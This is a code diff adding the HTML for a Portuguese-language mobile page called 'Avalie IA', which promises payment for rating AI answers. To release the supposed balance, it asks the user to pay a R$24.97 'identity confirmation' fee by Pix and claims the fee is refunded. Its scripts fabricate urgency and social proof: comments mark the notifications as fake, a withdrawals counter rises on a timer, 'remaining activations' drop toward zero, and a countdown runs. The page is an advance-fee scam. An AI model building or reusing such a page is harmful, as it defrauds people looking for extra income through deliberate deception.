@@ -1,0 +1,243 @@
+<html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ganhe Dinheiro Avaliando IA – Avalie IA</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+
+  <!-- Font Awesome Free CDN -->
+<link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous">
+
+
+
+  <!-- SEO -->
+  <meta name="description" content="Ganhe dinheiro avaliando respostas de Inteligência Artificial com o Avalie IA. Experiência simples e direta pelo celular. Comece agora mesmo!">
+  <meta name="keywords" content="ganhar dinheiro online, avaliar respostas, IA, inteligência artificial, Avalie IA, aplicativo para renda extra">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="Avalie IA">
+
+  <!-- Canonical (para evitar conteúdo duplicado) -->
+  <link rel="canonical" href="https://avalieia.com">
+
+<!-- Idioma principal -->
+  <meta http-equiv="Content-Language" content="pt-BR">
+
+<!-- Título alternativo para navegadores e buscadores -->
+  <meta name="application-name" content="Avalie IA">
+
+  <!-- Open Graph (Facebook, WhatsApp, LinkedIn) -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://avalieia.com">
+  <meta property="og:title" content="Ganhe Dinheiro Avaliando IA – Avalie IA">
+  <meta property="og:description" content="Participe da nova tendência digital! Avalie respostas de inteligência artificial e receba por isso. Tudo pelo celular.">
+  <meta property="og:image" content="images/share.png">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:url" content="https://avalieia.com">
+  <meta name="twitter:title" content="Ganhe Dinheiro Avaliando IA – Avalie IA">
+  <meta name="twitter:description" content="Participe da nova tendência digital! Avalie respostas de IA e ganhe por isso, direto no celular.">
+  <meta name="twitter:image" content="https://avalieia.com/share.png">
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Estilos personalizados -->
+<link rel="stylesheet" href="css/style.css">
+
+  <!-- JavaScript externo -->
+  <script src="https://unpkg.com/imask"></script>
+  <script src="js/script.js" defer=""></script>
+
+  <!-- Melhor performance com fontes (caso use) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+
+  <!-- PWA (opcional) -->
+  <meta name="theme-color" content="#0f172a">
+
+  <!-- Google Analytics -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ELCNG9J9T4"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-ELCNG9J9T4');
+  </script>
+
+</head>
+<body class="flex items-center justify-center h-[100dvh] overflow-hidden text-white">
+
+  <audio id="audio-dinheiro" preload="auto">
+  <source src="media/dinheiro.ogg" type="audio/ogg">
+</audio>
+
+  <!-- Tela de carregamento -->
+  <div id="loader">
+    <div class="spinner"></div>
+    <span>Carregando Aplicativo...</span>
+  </div>
+
+  <!-- Notificação de saldo -->
+  <div id="notificacao"></div>
+
+  <!-- APP -->
+  <div id="app" class="hidden w-full max-w-sm h-[100dvh] bg-gray-900 rounded-none shadow-2xl flex flex-col overflow-hidden">
+    <header class="bg-gray-800 p-4 text-center border-b border-gray-700">
+  <img src="images/logo.png" alt="Avalie IA" class="h-20 mx-auto">
+</header>
+
+
+
+    <section class="bg-gray-800 p-6 text-center border-b border-gray-700">
+      <p class="text-sm text-gray-300">Saldo Atual</p>
+      <h2 id="saldo" class="text-4xl font-bold text-green-400 mt-2 animate-scale">R$ 0,00</h2>
+    </section>
+
+    <div id="chat" class="flex-1 p-4 space-y-3 overflow-y-auto bg-gray-900 text-sm"></div>
+
+    <div id="areaPergunta" class="p-4 border-t border-gray-700 flex justify-center bg-gray-900 sticky bottom-0 z-10">
+      <button id="btnPerguntar" onclick="enviarPergunta()" class="bg-green-600 hover:bg-green-700 px-6 py-2 rounded-lg font-medium text-sm">
+        Fazer uma Pergunta
+      </button>
+    </div>
+
+    <div class="p-4 hidden bg-gray-900 sticky bottom-0 z-10" id="areaSaque">
+      <button onclick="abrirTelaSaque()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-xl text-sm transition">
+        Continuar Avaliando
+      </button>
+    </div>
+  </div>
+
+  <div id="paginaSaque" class="hidden w-full max-w-sm h-full max-h-[640px] bg-gray-900 text-white rounded-2xl shadow-2xl flex flex-col p-6 text-sm relative overflow-y-auto">
+
+  <!-- Notificações falsas -->
+  <div id="saqueNotificacoes" class="fixed top-4 left-1/2 transform -translate-x-1/2 w-[90%] z-50 flex flex-col gap-2 items-center pointer-events-none"></div>
+
+  <!-- Contador regressivo -->
+  <div class="bg-red-600 text-white text-xs p-3 rounded mb-3 border border-red-300 text-center font-semibold animate-pulse">
+     Confirme sua identidade em <span id="contadorPix">05:00</span> para liberar o seu saldo.
+  </div>
+
+  <!-- Título -->
+  <h2 class="text-center text-xl font-bold mb-3 text-green-400">Confirme sua identidade</h2>
+
+  <!-- Vídeo de explicação -->
+  <div class="video-wrapper mb-4" onclick="iniciarVideo()">
+    <div class="video-cover" id="videoCover"></div>
+    <video id="video" preload="metadata" class="rounded-xl w-full">
+      <source src="media/video.mp4" type="video/mp4">
+      Seu navegador não suporta o vídeo.
+    </video>
+  </div>
+
+  <!-- Saldo Disponível -->
+  <div class="bg-green-100 text-green-700 text-xs p-3 rounded border border-green-300 flex items-center gap-2">
+    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-green-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c1.104 0 2 .896 2 2s-.896 2-2 2m0-4v8m8-4a8 8 0 11-16 0 8 8 0 0116 0z"></path>
+    </svg>
+    <span><strong>Saldo disponível:</strong><span id="valorSaque" class="text-green-700 font-bold">0,00</span></span>
+  </div>
+<br>
+  <!-- Prova Social -->
+ <p id="statusSaque" class="text-xs text-yellow-400 mt-2 text-center">
+  <strong><span id="qtdSaques">193</span> usuários</strong> sacaram hoje. <br>Restam <strong><span id="qtdAtivacoes">11</span> ativações</strong> disponíveis.
+</p>
+
+  <!-- Botão de pagamento -->
+  <button onclick="irParaCheckout()" id="btnPagar" class="mt-6 w-full bg-gradient-to-r from-green-500 to-green-700 hover:from-green-600 hover:to-green-800 text-white font-bold py-3 rounded-xl shadow-md text-lg text-center flex items-center justify-center gap-2 transition">
+    <span id="btnPagarTexto">Confirmar Identidade [24,97]</span>
+    <svg id="btnSpinner" class="hidden animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path>
+    </svg>
+  </button>
+
+  <!-- Explicação da taxa -->
+  <div class="mt-6 bg-gray-800 border border-gray-700 p-3 rounded text-xs text-gray-300">
+    <div class="flex items-center mb-2">
+      <svg class="w-4 h-4 text-green-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path d="M12 11v2m0 0h.01M12 4a8 8 0 00-8 8 8 8 0 1016 0 8 8 0 00-8-8z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      <strong>Entenda o custo de processamento:</strong>
+    </div>
+    O custo de <strong>processamento</strong> é apenas para confirmação da identidade. Após o pagamento, o valor será estornado instantaneamente via Pix.
+  </div>
+
+  <!-- Segurança -->
+  <div class="text-xs text-gray-500 mt-6 text-center flex flex-col items-center gap-1">
+    <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c1.104 0 2-.896 2-2s-.896-2-2-2m0 0a2 2 0 00-2 2c0 .73.386 1.373.968 1.73A2 2 0 0010 13h4a2 2 0 00-.968-1.73c.582-.357.968-1 0-1.73M12 14v2m0 4a8 8 0 100-16 8 8 0 000 16z"></path>
+    </svg>
+    Pagamento seguro via Pix com tecnologia SSL. Nenhum dado sensível é armazenado.
+  </div>
+</div>
+
+<script>
+  let totalSaques = 193;
+  let ativacoesRestantes = 11;
+
+  function atualizarStatusSaque() {
+    const qtdSaquesEl = document.getElementById('qtdSaques');
+    const qtdAtivacoesEl = document.getElementById('qtdAtivacoes');
+    const statusSaqueEl = document.getElementById('statusSaque');
+
+    if (!qtdSaquesEl || !qtdAtivacoesEl || !statusSaqueEl) return;
+
+    if (ativacoesRestantes > 0) {
+      qtdSaquesEl.textContent = totalSaques;
+      qtdAtivacoesEl.textContent = ativacoesRestantes;
+    } else {
+      statusSaqueEl.innerHTML = `<svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <strong>Última ativação disponível!</strong> Corra para liberar seu saque agora.`;
+    }
+  }
+
+  // Atualiza imediatamente ao carregar
+  atualizarStatusSaque();
+
+  // Aumenta número de saques a cada 5 segundos
+  setInterval(() => {
+    totalSaques++;
+    atualizarStatusSaque();
+  }, 3000);
+
+  // Diminui ativações a cada 15 segundos
+  setInterval(() => {
+    if (ativacoesRestantes > 1) {
+      ativacoesRestantes--;
+    } else if (ativacoesRestantes === 1) {
+      ativacoesRestantes = 0;
+    }
+    atualizarStatusSaque();
+  }, 15000);
+</script>
+
+<script>
+  // Contador regressivo de 5 minutos (300 segundos)
+  let tempo = 300; // 5 minutos
+  const contador = document.getElementById('contadorPix');
+
+  function atualizarContadorPix() {
+    if (!contador) return;
+
+    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+    const segundos = String(tempo % 60).padStart(2, '0');
+    contador.textContent = `${minutos}:${segundos}`;
+    tempo--;
+
+    if (tempo >= 0) {
+      setTimeout(atualizarContadorPix, 1000);
+    } else {
+      contador.textContent = "Expirado";
+      // Aqui você pode exibir uma mensagem se quiser
+    }
+  }
+
+  // Inicia o contador automaticamente ao carregar
+  if (contador) atualizarContadorPix();
+</script>
+
+
+
+</body></html>
